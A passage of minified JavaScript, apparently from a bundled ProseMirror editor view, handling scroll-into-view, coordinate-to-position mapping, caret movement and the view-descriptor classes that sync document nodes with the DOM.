e=t.getBoundingClientRect(),n=e.width/t.offsetWidth||1,r=e.height/t.offsetHeight||1;return{left:e.left,right:e.left+t.clientWidth*n,top:e.top,bottom:e.top+t.clientHeight*r}}function fv(t,e,n){let r=t.someProp("scrollThreshold")||0,i=t.someProp("scrollMargin")||5,s=t.dom.ownerDocument;for(let o=n||t.dom;o;){if(o.nodeType!=1){o=Es(o);continue}let a=o,l=a==s.body,u=l?L3(s):I3(a),c=0,d=0;if(e.top<u.top+Nn(r,"top")?d=-(u.top-e.top+Nn(i,"top")):e.bottom>u.bottom-Nn(r,"bottom")&&(d=e.bottom-e.top>u.bottom-u.top?e.top+Nn(i,"top")-u.top:e.bottom-u.bottom+Nn(i,"bottom")),e.left<u.left+Nn(r,"left")?c=-(u.left-e.left+Nn(i,"left")):e.right>u.right-Nn(r,"right")&&(c=e.right-u.right+Nn(i,"right")),c||d)if(l)s.defaultView.scrollBy(c,d);else{let h=a.scrollLeft,p=a.scrollTop;d&&(a.scrollTop+=d),c&&(a.scrollLeft+=c);let y=a.scrollLeft-h,x=a.scrollTop-p;e={left:e.left-y,top:e.top-x,right:e.right-y,bottom:e.bottom-x}}let f=l?"fixed":getComputedStyle(o).position;if(/^(fixed|sticky)$/.test(f))break;o=f=="absolute"?o.offsetParent:Es(o)}}function j3(t){let e=t.dom.getBoundingClientRect(),n=Math.max(0,e.top),r,i;for(let s=(e.left+e.right)/2,o=n+1;o<Math.min(innerHeight,e.bottom);o+=5){let a=t.root.elementFromPoint(s,o);if(!a||a==t.dom||!t.dom.contains(a))continue;let l=a.getBoundingClientRect();if(l.top>=n-20){r=a,i=l.top;break}}return{refDOM:r,refTop:i,stack:BC(t.dom)}}function BC(t){let e=[],n=t.ownerDocument;for(let r=t;r&&(e.push({dom:r,top:r.scrollTop,left:r.scrollLeft}),t!=n);r=Es(r));return e}function F3({refDOM:t,refTop:e,stack:n}){let r=t?t.getBoundingClientRect().top:0;VC(n,r==0?0:r-e)}function VC(t,e){for(let n=0;n<t.length;n++){let{dom:r,top:i,left:s}=t[n];r.scrollTop!=i+e&&(r.scrollTop=i+e),r.scrollLeft!=s&&(r.scrollLeft=s)}}let Oi=null;function B3(t){if(t.setActive)return t.setActive();if(Oi)return t.focus(Oi);let e=BC(t);t.focus(Oi==null?{get preventScroll(){return Oi={preventScroll:!0},!0}}:void 0),Oi||(Oi=!1,VC(e,0))}function zC(t,e){let n,r=2e8,i,s=0,o=e.top,a=e.top,l,u;for(let c=t.firstChild,d=0;c;c=c.nextSibling,d++){let f;if(c.nodeType==1)f=c.getClientRects();else if(c.nodeType==3)f=Dn(c).getClientRects();else continue;for(let h=0;h<f.length;h++){let p=f[h];if(p.top<=o&&p.bottom>=a){o=Math.max(p.bottom,o),a=Math.min(p.top,a);let y=p.left>e.left?p.left-e.left:p.right<e.left?e.left-p.right:0;if(y<r){n=c,r=y,i=y&&n.nodeType==3?{left:p.right<e.left?p.right:p.left,top:e.top}:e,c.nodeType==1&&y&&(s=d+(e.left>=(p.left+p.right)/2?1:0));continue}}else p.top>e.top&&!l&&p.left<=e.left&&p.right>=e.left&&(l=c,u={left:Math.max(p.left,Math.min(p.right,e.left)),top:p.top});!n&&(e.left>=p.right&&e.top>=p.top||e.left>=p.left&&e.top>=p.bottom)&&(s=d+1)}}return!n&&l&&(n=l,i=u,r=0),n&&n.nodeType==3?V3(n,i):!n||r&&n.nodeType==1?{node:t,offset:s}:zC(n,i)}function V3(t,e){let n=t.nodeValue.length,r=document.createRange();for(let i=0;i<n;i++){r.setEnd(t,i+1),r.setStart(t,i);let s=tr(r,1);if(s.top!=s.bottom&&yg(e,s))return{node:t,offset:i+(e.left>=(s.left+s.right)/2?1:0)}}return{node:t,offset:0}}function yg(t,e){return t.left>=e.left-1&&t.left<=e.right+1&&t.top>=e.top-1&&t.top<=e.bottom+1}function z3(t,e){let n=t.parentNode;return n&&/^li$/i.test(n.nodeName)&&e.left<t.getBoundingClientRect().left?n:t}function _3(t,e,n){let{node:r,offset:i}=zC(e,n),s=-1;if(r.nodeType==1&&!r.firstChild){let o=r.getBoundingClientRect();s=o.left!=o.right&&n.left>(o.left+o.right)/2?1:-1}return t.docView.posFromDOM(r,i,s)}function $3(t,e,n,r){let i=-1;for(let s=e,o=!1;s!=t.dom;){let a=t.docView.nearestDesc(s,!0),l;if(!a)return null;if(a.dom.nodeType==1&&(a.node.isBlock&&a.parent||!a.contentDOM)&&((l=a.dom.getBoundingClientRect()).width||l.height)&&(a.node.isBlock&&a.parent&&!/^T(R|BODY|HEAD|FOOT)$/.test(a.dom.nodeName)&&(!o&&l.left>r.left||l.top>r.top?i=a.posBefore:(!o&&l.right<r.left||l.bottom<r.top)&&(i=a.posAfter),o=!0),!a.contentDOM&&i<0&&!a.node.isText))return(a.node.isBlock?r.top<(l.top+l.bottom)/2:r.left<(l.left+l.right)/2)?a.posBefore:a.posAfter;s=a.dom.parentNode}return i>-1?i:t.docView.posFromDOM(e,n,-1)}function _C(t,e,n){let r=t.childNodes.length;if(r&&n.top<n.bottom)for(let i=Math.max(0,Math.min(r-1,Math.floor(r*(e.top-n.top)/(n.bottom-n.top))-2)),s=i;;){let o=t.childNodes[s];if(o.nodeType==1){let a=o.getClientRects();for(let l=0;l<a.length;l++){let u=a[l];if(yg(e,u))return _C(o,e,u)}}if((s=(s+1)%r)==i)break}return t}function H3(t,e){let n=t.dom.ownerDocument,r,i=0,s=R3(n,e.left,e.top);s&&({node:r,offset:i}=s);let o=(t.root.elementFromPoint?t.root:n).elementFromPoint(e.left,e.top),a;if(!o||!t.dom.contains(o.nodeType!=1?o.parentNode:o)){let u=t.dom.getBoundingClientRect();if(!yg(e,u)||(o=_C(t.dom,e,u),!o))return null}if(lt)for(let u=o;r&&u;u=Es(u))u.draggable&&(r=void 0);if(o=z3(o,e),r){if(an&&r.nodeType==1&&(i=Math.min(i,r.childNodes.length),i<r.childNodes.length)){let c=r.childNodes[i],d;c.nodeName=="IMG"&&(d=c.getBoundingClientRect()).right<=e.left&&d.bottom>e.top&&i++}let u;Va&&i&&r.nodeType==1&&(u=r.childNodes[i-1]).nodeType==1&&u.contentEditable=="false"&&u.getBoundingClientRect().top>=e.top&&i--,r==t.dom&&i==r.childNodes.length-1&&r.lastChild.nodeType==1&&e.top>r.lastChild.getBoundingClientRect().bottom?a=t.state.doc.content.size:(i==0||r.nodeType!=1||r.childNodes[i-1].nodeName!="BR")&&(a=$3(t,r,i,e))}a==null&&(a=_3(t,o,e));let l=t.docView.nearestDesc(o,!0);return{pos:a,inside:l?l.posAtStart-l.border:-1}}function hv(t){return t.top<t.bottom||t.left<t.right}function tr(t,e){let n=t.getClientRects();if(n.length){let r=n[e<0?0:n.length-1];if(hv(r))return r}return Array.prototype.find.call(n,hv)||t.getBoundingClientRect()}const U3=/[\u0590-\u05f4\u0600-\u06ff\u0700-\u08ac]/;function $C(t,e,n){let{node:r,offset:i,atom:s}=t.docView.domFromPos(e,n<0?-1:1),o=Va||an;if(r.nodeType==3)if(o&&(U3.test(r.nodeValue)||(n<0?!i:i==r.nodeValue.length))){let l=tr(Dn(r,i,i),n);if(an&&i&&/\s/.test(r.nodeValue[i-1])&&i<r.nodeValue.length){let u=tr(Dn(r,i-1,i-1),-1);if(u.top==l.top){let c=tr(Dn(r,i,i+1),-1);if(c.top!=l.top)return to(c,c.left<u.left)}}return l}else{let l=i,u=i,c=n<0?1:-1;return n<0&&!i?(u++,c=-1):n>=0&&i==r.nodeValue.length?(l--,c=1):n<0?l--:u++,to(tr(Dn(r,l,u),c),c<0)}if(!t.state.doc.resolve(e-(s||0)).parent.inlineContent){if(s==null&&i&&(n<0||i==_t(r))){let l=r.childNodes[i-1];if(l.nodeType==1)return uf(l.getBoundingClientRect(),!1)}if(s==null&&i<_t(r)){let l=r.childNodes[i];if(l.nodeType==1)return uf(l.getBoundingClientRect(),!0)}return uf(r.getBoundingClientRect(),n>=0)}if(s==null&&i&&(n<0||i==_t(r))){let l=r.childNodes[i-1],u=l.nodeType==3?Dn(l,_t(l)-(o?0:1)):l.nodeType==1&&(l.nodeName!="BR"||!l.nextSibling)?l:null;if(u)return to(tr(u,1),!1)}if(s==null&&i<_t(r)){let l=r.childNodes[i];for(;l.pmViewDesc&&l.pmViewDesc.ignoreForCoords;)l=l.nextSibling;let u=l?l.nodeType==3?Dn(l,0,o?0:1):l.nodeType==1?l:null:null;if(u)return to(tr(u,-1),!0)}return to(tr(r.nodeType==3?Dn(r):r,-n),n>=0)}function to(t,e){if(t.width==0)return t;let n=e?t.left:t.right;return{top:t.top,bottom:t.bottom,left:n,right:n}}function uf(t,e){if(t.height==0)return t;let n=e?t.top:t.bottom;return{top:n,bottom:n,left:t.left,right:t.right}}function HC(t,e,n){let r=t.state,i=t.root.activeElement;r!=e&&t.updateState(e),i!=t.dom&&t.focus();try{return n()}finally{r!=e&&t.updateState(r),i!=t.dom&&i&&i.focus()}}function W3(t,e,n){let r=e.selection,i=n=="up"?r.$from:r.$to;return HC(t,e,()=>{let{node:s}=t.docView.domFromPos(i.pos,n=="up"?-1:1);for(;;){let a=t.docView.nearestDesc(s,!0);if(!a)break;if(a.node.isBlock){s=a.contentDOM||a.dom;break}s=a.dom.parentNode}let o=$C(t,i.pos,1);for(let a=s.firstChild;a;a=a.nextSibling){let l;if(a.nodeType==1)l=a.getClientRects();else if(a.nodeType==3)l=Dn(a,0,a.nodeValue.length).getClientRects();else continue;for(let u=0;u<l.length;u++){let c=l[u];if(c.bottom>c.top+1&&(n=="up"?o.top-c.top>(c.bottom-o.top)*2:c.bottom-o.bottom>(o.bottom-c.top)*2))return!1}}return!0})}const K3=/[\u0590-\u08ac]/;function q3(t,e,n){let{$head:r}=e.selection;if(!r.parent.isTextblock)return!1;let i=r.parentOffset,s=!i,o=i==r.parent.content.size,a=t.domSelection();return a?!K3.test(r.parent.textContent)||!a.modify?n=="left"||n=="backward"?s:o:HC(t,e,()=>{let{focusNode:l,focusOffset:u,anchorNode:c,anchorOffset:d}=t.domSelectionRange(),f=a.caretBidiLevel;a.modify("move",n,"character");let h=r.depth?t.docView.domAfterPos(r.before()):t.dom,{focusNode:p,focusOffset:y}=t.domSelectionRange(),x=p&&!h.contains(p.nodeType==1?p:p.parentNode)||l==p&&u==y;try{a.collapse(c,d),l&&(l!=c||u!=d)&&a.extend&&a.extend(l,u)}catch{}return f!=null&&(a.caretBidiLevel=f),x}):r.pos==r.start()||r.pos==r.end()}let pv=null,mv=null,gv=!1;function G3(t,e,n){return pv==e&&mv==n?gv:(pv=e,mv=n,gv=n=="up"||n=="down"?W3(t,e,n):q3(t,e,n))}const Kt=0,yv=1,ei=2,Cn=3;class za{constructor(e,n,r,i){this.parent=e,this.children=n,this.dom=r,this.contentDOM=i,this.dirty=Kt,r.pmViewDesc=this}matchesWidget(e){return!1}matchesMark(e){return!1}matchesNode(e,n,r){return!1}matchesHack(e){return!1}parseRule(){return null}stopEvent(e){return!1}get size(){let e=0;for(let n=0;n<this.children.length;n++)e+=this.children[n].size;return e}get border(){return 0}destroy(){this.parent=void 0,this.dom.pmViewDesc==this&&(this.dom.pmViewDesc=void 0);for(let e=0;e<this.children.length;e++)this.children[e].destroy()}posBeforeChild(e){for(let n=0,r=this.posAtStart;;n++){let i=this.children[n];if(i==e)return r;r+=i.size}}get posBefore(){return this.parent.posBeforeChild(this)}get posAtStart(){return this.parent?this.parent.posBeforeChild(this)+this.border:0}get posAfter(){return this.posBefore+this.size}get posAtEnd(){return this.posAtStart+this.size-2*this.border}localPosFromDOM(e,n,r){if(this.contentDOM&&this.contentDOM.contains(e.nodeType==1?e:e.parentNode))if(r<0){let s,o;if(e==this.contentDOM)s=e.childNodes[n-1];else{for(;e.parentNode!=this.contentDOM;)e=e.parentNode;s=e.previousSibling}for(;s&&!((o=s.pmViewDesc)&&o.parent==this);)s=s.previousSibling;return s?this.posBeforeChild(o)+o.size:this.posAtStart}else{let s,o;if(e==this.contentDOM)s=e.childNodes[n];else{for(;e.parentNode!=this.contentDOM;)e=e.parentNode;s=e.nextSibling}for(;s&&!((o=s.pmViewDesc)&&o.parent==this);)s=s.nextSibling;return s?this.posBeforeChild(o):this.posAtEnd}let i;if(e==this.dom&&this.contentDOM)i=n>Ue(this.contentDOM);else if(this.contentDOM&&this.contentDOM!=this.dom&&this.dom.contains(this.contentDOM))i=e.compareDocumentPosition(this.contentDOM)&2;else if(this.dom.firstChild){if(n==0)for(let s=e;;s=s.parentNode){if(s==this.dom){i=!1;break}if(s.previousSibling)break}if(i==null&&n==e.childNodes.length)for(let s=e;;s=s.parentNode){if(s==this.dom){i=!0;break}if(s.nextSibling)break}}return i??r>0?this.posAtEnd:this.posAtStart}nearestDesc(e,n=!1){for(let r=!0,i=e;i;i=i.parentNode){let s=this.getDesc(i),o;if(s&&(!n||s.node))if(r&&(o=s.nodeDOM)&&!(o.nodeType==1?o.contains(e.nodeType==1?e:e.parentNode):o==e))r=!1;else return s}}getDesc(e){let n=e.pmViewDesc;for(let r=n;r;r=r.parent)if(r==this)return n}posFromDOM(e,n,r){for(let i=e;i;i=i.parentNode){let s=this.getDesc(i);if(s)return s.localPosFromDOM(e,n,r)}return-1}descAt(e){for(let n=0,r=0;n<this.children.length;n++){let i=this.children[n],s=r+i.size;if(r==e&&s!=r){for(;!i.border&&i.children.length;)for(let o=0;o<i.children.length;o++){let a=i.children[o];if(a.size){i=a;break}}return i}if(e<s)return i.descAt(e-r-i.border);r=s}}domFromPos(e,n){if(!this.contentDOM)return{node:this.dom,offset:0,atom:e+1};let r=0,i=0;for(let s=0;r<this.children.length;r++){let o=this.children[r],a=s+o.size;if(a>e||o instanceof WC){i=e-s;break}s=a}if(i)return this.children[r].domFromPos(i-this.children[r].border,n);for(let s;r&&!(s=this.children[r-1]).size&&s instanceof UC&&s.side>=0;r--);if(n<=0){let s,o=!0;for(;s=r?this.children[r-1]:null,!(!s||s.dom.parentNode==this.contentDOM);r--,o=!1);return s&&n&&o&&!s.border&&!s.domAtom?s.domFromPos(s.size,n):{node:this.contentDOM,offset:s?Ue(s.dom)+1:0}}else{let s,o=!0;for(;s=r<this.children.length?this.children[r]:null,!(!s||s.dom.parentNode==this.contentDOM);r++,o=!1);return s&&o&&!s.border&&!s.domAtom?s.domFromPos(0,n):{node:this.contentDOM,offset:s?Ue(s.dom):this.contentDOM.childNodes.length}}}parseRange(e,n,r=0){if(this.children.length==0)return{node:this.contentDOM,from:e,to:n,fromOffset:0,toOffset:this.contentDOM.childNodes.length};let i=-1,s=-1;for(let o=r,a=0;;a++){let l=this.children[a],u=o+l.size;if(i==-1&&e<=u){let c=o+l.border;if(e>=c&&n<=u-l.border&&l.node&&l.contentDOM&&this.contentDOM.contains(l.contentDOM))return l.parseRange(e,n,c);e=o;for(let d=a;d>0;d--){let f=this.children[d-1];if(f.size&&f.dom.parentNode==this.contentDOM&&!f.emptyChildAt(1)){i=Ue(f.dom)+1;break}e-=f.size}i==-1&&(i=0)}if(i>-1&&(u>n||a==this.children.length-1)){n=u;for(let c=a+1;c<this.children.length;c++){let d=this.children[c];if(d.size&&d.dom.parentNode==this.contentDOM&&!d.emptyChildAt(-1)){s=Ue(d.dom);break}n+=d.size}s==-1&&(s=this.contentDOM.childNodes.length);break}o=u}return{node:this.contentDOM,from:e,to:n,fromOffset:i,toOffset:s}}emptyChildAt(e){if(this.border||!this.contentDOM||!this.children.length)return!1;let n=this.children[e<0?0:this.children.length-1];return n.size==0||n.emptyChildAt(e)}domAfterPos(e){let{node:n,offset:r}=this.domFromPos(e,0);if(n.nodeType!=1||r==n.childNodes.length)throw new RangeError("No node after pos "+e);return n.childNodes[r]}setSelection(e,n,r,i=!1){let s=Math.min(e,n),o=Math.max(e,n);for(let h=0,p=0;h<this.children.length;h++){let y=this.children[h],x=p+y.size;if(s>p&&o<x)return y.setSelection(e-p-y.border,n-p-y.border,r,i);p=x}let a=this.domFromPos(e,e?-1:1),l=n==e?a:this.domFromPos(n,n?-1:1),u=r.root.getSelection(),c=r.domSelectionRange(),d=!1;if((an||lt)&&e==n){let{node:h,offset:p}=a;if(h.nodeType==3){if(d=!!(p&&h.nodeValue[p-1]==`
`),d&&p==h.nodeValue.length)for(let y=h,x;y;y=y.parentNode){if(x=y.nextSibling){x.nodeName=="BR"&&(a=l={node:x.parentNode,offset:Ue(x)+1});break}let g=y.pmViewDesc;if(g&&g.node&&g.node.isBlock)break}}else{let y=h.childNodes[p-1];d=y&&(y.nodeName=="BR"||y.contentEditable=="false")}}if(an&&c.focusNode&&c.focusNode!=l.node&&c.focusNode.nodeType==1){let h=c.focusNode.childNodes[c.focusOffset];h&&h.contentEditable=="false"&&(i=!0)}if(!(i||d&&lt)&&bi(a.node,a.offset,c.anchorNode,c.anchorOffset)&&bi(l.node,l.offset,c.focusNode,c.focusOffset))return;let f=!1;if((u.extend||e==n)&&!d){u.collapse(a.node,a.offset);try{e!=n&&u.extend(l.node,l.offset),f=!0}catch{}}if(!f){if(e>n){let p=a;a=l,l=p}let h=document.createRange();h.setEnd(l.node,l.offset),h.setStart(a.node,a.offset),u.removeAllRanges(),u.addRange(h)}}ignoreMutation(e){return!this.contentDOM&&e.type!="selection"}get contentLost(){return this.contentDOM&&this.contentDOM!=this.dom&&!this.dom.contains(this.contentDOM)}markDirty(e,n){for(let r=0,i=0;i<this.children.length;i++){let s=this.children[i],o=r+s.size;if(r==o?e<=o&&n>=r:e<o&&n>r){let a=r+s.border,l=o-s.border;if(e>=a&&n<=l){this.dirty=e==r||n==o?ei:yv,e==a&&n==l&&(s.contentLost||s.dom.parentNode!=this.contentDOM)?s.dirty=Cn:s.markDirty(e-a,n-a);return}else s.dirty=s.dom==s.contentDOM&&s.dom.parentNode==this.contentDOM&&!s.children.length?ei:Cn}r=o}this.dirty=ei}markParentsDirty(){let e=1;for(let n=this.parent;n;n=n.parent,e++){let r=e==1?ei:yv;n.dirty<r&&(n.dirty=r)}}get domAtom(){return!1}get ignoreForCoords(){return!1}get ignoreForSelection(){return!1}isText(e){return!1}}class UC extends za{constructor(e,n,r,i){let s,o=n.type.toDOM;if(typeof o=="function"&&(o=o(r,()=>{if(!s)return i;if(s.parent)return s.parent.posBeforeChild(s)})),!n.type.spec.raw){if(o.nodeType!=1){let a=document.createElement("span");a.appendChild(o),o=a}o.contentEditable="false",o.classList.add("ProseMirror-widget")}super(e,[],o,null),this.widget=n,this.widget=n,s=this}matchesWidget(e){return this.dirty==Kt&&e.type.eq(this.widget.type)}parseRule(){return{ignore:!0}}stopEvent(e){let n=this.widget.spec.stopEvent;return n?n(e):!1}ignoreMutation(e){return e.type!="selection"||this.widget.spec.ignoreSelection}destroy(){this.widget.type.destroy(this.dom),super.destroy()}get domAtom(){return!0}get ignoreForSelection(){return!!this.widget.type.spec.relaxedSide}get side(){return this.widget.type.side}}class J3 extends za{constructor(e,n,r,i){super(e,[],n,null),this.textDOM=r,this.text=i}get size(){return this.text.length}localPosFromDOM(e,n){return e!=this.textDOM?this.posAtStart+(n?this.size:0):this.posAtStart+n}domFromPos(e){return{node:this.textDOM,offset:e}}ignoreMutation(e){return e.type==="characterData"&&e.target.nodeValue==e.oldValue}}class Ci extends za{constructor(e,n,r,i,s){super(e,[],r,i),this.mark=n,this.spec=s}static create(e,n,r,i){let s=i.nodeViews[n.type.name],o=s&&s(n,i,r);return(!o||!o.dom)&&(o=Ai.renderSpec(document,n.type.spec.toDOM(n,r),null,n.attrs)),new Ci(e,n,o.dom,o.contentDOM||o.dom,o)}parseRule(){return this.dirty&Cn||this.mark.type.spec.reparseInView?null:{mark:this.mark.type.name,attrs:this.mark.attrs,contentElement:this.contentDOM}}matchesMark(e){return this.dirty!=Cn&&this.mark.eq(e)}markDirty(e,n){if(super.markDirty(e,n),this.dirty!=Kt){let r=this.parent;for(;!r.node;)r=r.parent;r.dirty<this.dirty&&(r.dirty=this.dirty),this.dirty=Kt}}slice(e,n,r){let i=Ci.create(this.parent,this.mark,!0,r),s=this.children,o=this.size;n<o&&(s=ip(s,n,o,r)),e>0&&(s=ip(s,0,e,r));for(let a=0;a<s.length;a++)s[a].parent=i;return i.children=s,i}ignoreMutation(e){return this.spec.ignoreMutation?this.spec.ignoreMutation(e):super.ignoreMutation(e)}destroy(){this.spec.destroy&&this.spec.destroy(),super.destroy()}}class Mr extends za{constructor(e,n,r,i,s,o,a,l,u){super(e,[],s,o),this.node=n,this.outerDeco=r,this.innerDeco=i,this.nodeDOM=a}static create(e,n,r,i,s,o){let a=s.nodeViews[n.type.name],l,u=a&&a(n,s,()=>{if(!l)return o;if(l.parent)return l.parent.posBeforeChild(l)},r,i),c=u&&u.dom,d=u&&u.contentDOM;if(n.isText){if(!c)c=document.createTextNode(n.text);else if(c.nodeType!=3)throw new RangeError("Text must be rendered as a DOM text node")}else c||({dom:c,contentDOM:d}=Ai.renderSpec(document,n.type.spec.toDOM(n),null,n.attrs));!d&&!n.isText&&c.nodeName!="BR"&&(c.hasAttribute("contenteditable")||(c.contentEditable="false"),n.type.spec.draggable&&(c.draggable=!0));let f=c;return c=GC(c,r,n),u?l=new Y3(e,n,r,i,c,d||null,f,u,s,o+1):n.isText?new Jc(e,n,r,i,c,f,s):new Mr(e,n,r,i,c,d||null,f,s,o+1)}parseRule(){if(this.node.type.spec.reparseInView)return null;let e={node:this.node.type.name,attrs:this.node.attrs};if(this.node.type.whitespace=="pre"&&(e.preserveWhitespace="full"),!this.contentDOM)e.getContent=()=>this.node.content;else if(!this.contentLost)e.contentElement=this.contentDOM;else{for(let n=this.children.length-1;n>=0;n--){let r=this.children[n];if(this.dom.contains(r.dom.parentNode)){e.contentElement=r.dom.parentNode;break}}e.contentElement||(e.getContent=()=>A.empty)}return e}matchesNode(e,n,r){return this.dirty==Kt&&e.eq(this.node)&&Ou(n,this.outerDeco)&&r.eq(this.innerDeco)}get size(){return this.node.nodeSize}get border(){return this.node.isLeaf?0:1}updateChildren(e,n){let r=this.node.inlineContent,i=n,s=e.composing?this.localCompositionInfo(e,n):null,o=s&&s.pos>-1?s:null,a=s&&s.pos<0,l=new X3(this,o&&o.node,e);t4(this.node,this.innerDeco,(u,c,d)=>{u.spec.marks?l.syncToMarks(u.spec.marks,r,e):u.type.side>=0&&!d&&l.syncToMarks(c==this.node.childCount?ee.none:this.node.child(c).marks,r,e),l.placeWidget(u,e,i)},(u,c,d,f)=>{l.syncToMarks(u.marks,r,e);let h;l.findNodeMatch(u,c,d,f)||a&&e.state.selection.from>i&&e.state.selection.to<i+u.nodeSize&&(h=l.findIndexWithChild(s.node))>-1&&l.updateNodeAt(u,c,d,h,e)||l.updateNextNode(u,c,d,e,f,i)||l.addNode(u,c,d,e,i),i+=u.nodeSize}),l.syncToMarks([],r,e),this.node.isTextblock&&l.addTextblockHacks(),l.destroyRest(),(l.changed||this.dirty==ei)&&(o&&this.protectLocalComposition(e,o),KC(this.contentDOM,this.children,e),Ts&&n4(this.dom))}localCompositionInfo(e,n){let{from:r,to:i}=e.state.selection;if(!(e.state.selection instanceof $)||r<n||i>n+this.node.content.size)return null;let s=e.input.compositionNode;if(!s||!this.dom.contains(s.parentNode))return null;if(this.node.inlineContent){let o=s.nodeValue,a=r4(this.node.content,o,r-n,i-n);return a<0?null:{node:s,pos:a,text:o}}else return{node:s,pos:-1,text:""}}protectLocalComposition(e,{node:n,pos:r,text:i}){if(this.getDesc(n))return;let s=n;for(;s.parentNode!=this.contentDOM;s=s.parentNode){for(;s.previousSibling;)s.parentNode.removeChild(s.previousSibling);for(;s.nextSibling;)s.parentNode.removeChild(s.nextSibling);s.pmViewDesc&&(s.pmViewDesc=void 0)}let o=new J3(this,s,n,i);e.input.compositionNodes.push(o),this.children=ip(this.children,r,r+i.length,e,o)}update(e,n,r,i){return this.dirty==Cn||!e.sameMarkup(this.node)?!1:(this.updateInner(e,n,r,i),!0)}updateInner(e,n,r,i){this.updateOuterDeco(n),this.node=e,this.innerDeco=r,this.contentDOM&&this.updateChildren(i,this.posAtStart),this.dirty=Kt}updateOuterDeco(e){if(Ou(e,this.outerDeco))return;let n=this.nodeDOM.nodeType!=1,r=this.dom;this.dom=qC(this.dom,this.nodeDOM,rp(this.outerDeco,this.node,n),rp(e,this.node,n)),this.dom!=r&&(r.pmViewDesc=void 0,this.dom.pmViewDesc=this),this.outerDeco=e}selectNode(){this.nodeDOM.nodeType==1&&this.nodeDOM.classList.add("ProseMirror-selectednode"),(this.contentDOM||!this.node.type.spec.draggable)&&(this.dom.draggable=!0)}deselectNode(){this.nodeDOM.nodeType==1&&(this.nodeDOM.classList.remove("ProseMirror-selectednode"),(this.contentDOM||!this.node.type.spec.draggable)&&this.dom.removeAttribute("draggable"))}get domAtom(){return this.node.isAtom}}function xv(t,e,n,r,i){GC(r,e,t);let s=new Mr(void 0,t,e,n,r,r,r,i,0);return s.contentDOM&&s.updateChildren(i,0),s}class Jc extends Mr{constructor(e,n,r,i,s,o,a){super(e,n,r,i,s,null,o,a,0)}parseRule(){let e=this.nodeDOM.parentNode;for(;e&&e!=this.dom&&!e.pmIsDeco;)e=e.parentNode;return{skip:e||!0}}update(e,n,r,i){return this.dirty==Cn||this.dirty!=Kt&&!this.inParent()||!e.sameMarkup(this.node)?!1:(this.updateOuterDeco(n),(this.dirty!=Kt||e.text!=this.node.text)&&e.text!=this.nodeDOM.nodeValue&&(this.nodeDOM.nodeValue=e.text,i.trackWrites==this.nodeDOM&&(i.trackWrites=null)),this.node=e,this.dirty=Kt,!0)}inParent(){let e=this.parent.contentDOM;for(let n=this.nodeDOM;n;n=n.parentNode)if(n==e)return!0;return!1}domFromPos(e){return{node:this.nodeDOM,offset:e}}localPosFromDOM(e,n,r){return e==this.nodeDOM?this.posAtStart+Math.min(n,this.node.text.length):super.localPosFromDOM(e,n,r)}ignoreMutation(e){return e.type!="characterData"&&e.type!="selection"}slice(e,n,r){let i=this.node.cut(e,n),s=document.createTextNode(i.text);return new Jc(this.parent,i,this.outerDeco,this.innerDeco,s,s,r)}markDirty(e,n){super.markDirty(e,n),this.dom!=this.nodeDOM&&(e==0||n==this.nodeDOM.nodeValue.length)&&(this.dirty=Cn)}get domAtom(){return!1}isText(e){return this.node.text==e}}class WC extends za{parseRule(){return{ignore:!0}}matchesHack(e){return this.dirty==Kt&&this.dom.nodeName==e}get domAtom(){return!0}get ignoreForCoords(){return this.dom.nodeName=="IMG"}}class Y3 extends Mr{constructor(e,n,r,i,s,o,a,l,u,c){super(e,n,r,i,s,o,a,u,c),this.spec=l}update(e,n,r,i){if(this.dirty==Cn)return!1;if(this.spec.update&&(this.node.type==e.type||this.spec.multiType)){let s=this.spec.update(e,n,r);return s&&this.updateInner(e,n,r,i),s}else return!this.contentDOM&&!e.isLeaf?!1:super.update(e,n,r,i)}selectNode(){this.spec.selectNode?this.spec.selectNode():super.selectNode()}deselectNode(){this.spec.deselectNode?this.spec.deselectNode():super.deselectNode()}setSelection(e,n,r,i){this.spec.setSelection?this.spec.setSelection(e,n,r.root):super.setSelection(e,n,r,i)}destroy(){this.spec.destroy&&this.spec.destroy(),super.destroy()}stopEvent(e){return this.spec.stopEvent?this.spec.stopEvent(e):!1}ignoreMutation(e){return this.spec.ignoreMutation?this.spec.ignoreMutation(e):super.ignoreMutation(e)}}function KC(t,e,n){let r=t.firstChild,i=!1;for(let s=0;s<e.length;s++){let o=e[s],a=o.dom;if(a.parentNode==t){for(;a!=r;)r=vv(r),i=!0;r=r.nextSibling}else i=!0,t.insertBefore(a,r);if(o instanceof Ci){let l=r?r.previousSibling:t.lastChild;KC(o.contentDOM,o.children,n),r=l?l.nextSibling:t.firstChild}}for(;r;)r=vv(r),i=!0;i&&n.trackWrites==t&&(n.trackWrites=null)}const Ao=function(t){t&&(this.nodeName=t)};Ao.prototype=Object.create(null);const ti=[new Ao];function rp(t,e,n){if(t.length==0)return ti;let r=n?ti[0]:new Ao,i=[r];for(let s=0;s<t.length;s++){let o=t[s].type.attrs;if(o){o.nodeName&&i.push(r=new Ao(o.nodeName));for(let a in o){let l=o[a];l!=null&&(n&&i.length==1&&i.push(r=new Ao(e.isInline?"span":"div")),a=="class"?r.class=(r.class?r.class+" ":"")+l:a=="style"?r.style=(r.style?r.style+";":"")+l:a!="nodeName"&&(r[a]=l))}}}return i}function qC(t,e,n,r){if(n==ti&&r==ti)return e;let i=e;for(let s=0;s<r.length;s++){let o=r[s],a=n[s];if(s){let l;a&&a.nodeName==o.nodeName&&i!=t&&(l=i.parentNode)&&l.nodeName.toLowerCase()==o.nodeName||(l=document.createElement(o.nodeName),l.pmIsDeco=!0,l.appendChild(i),a=ti[0]),i=l}Q3(i,a||ti[0],o)}return i}function Q3(t,e,n){for(let r in e)r!="class"&&r!="style"&&r!="nodeName"&&!(r in n)&&t.removeAttribute(r);for(let r in n)r!="class"&&r!="style"&&r!="nodeName"&&n[r]!=e[r]&&t.setAttribute(r,n[r]);if(e.class!=n.class){let r=e.class?e.class.split(" ").filter(Boolean):[],i=n.class?n.class.split(" ").filter(Boolean):[];for(let s=0;s<r.length;s++)i.indexOf(r[s])==-1&&t.classList.remove(r[s]);for(let s=0;s<i.length;s++)r.indexOf(i[s])==-1&&t.classList.add(i[s]);t.classList.length==0&&t.removeAttribute("class")}if(e.style!=n.style){if(e.style){let r=/\s*([\w\-\xa1-\uffff]+)\s*:(?:"(?:\\.|[^"])*"|'(?:\\.|[^'])*'|\(.*?\)|[^;])*/g,i;for(;i=r.exec(e.style);)t.style.removeProperty(i[1])}n.style&&(t.style.cssText+=n.style)}}function GC(t,e,n){return qC(t,t,ti,rp(e,n,t.nodeType!=1))}function Ou(t,e){if(t.length!=e.length)return!1;for(let 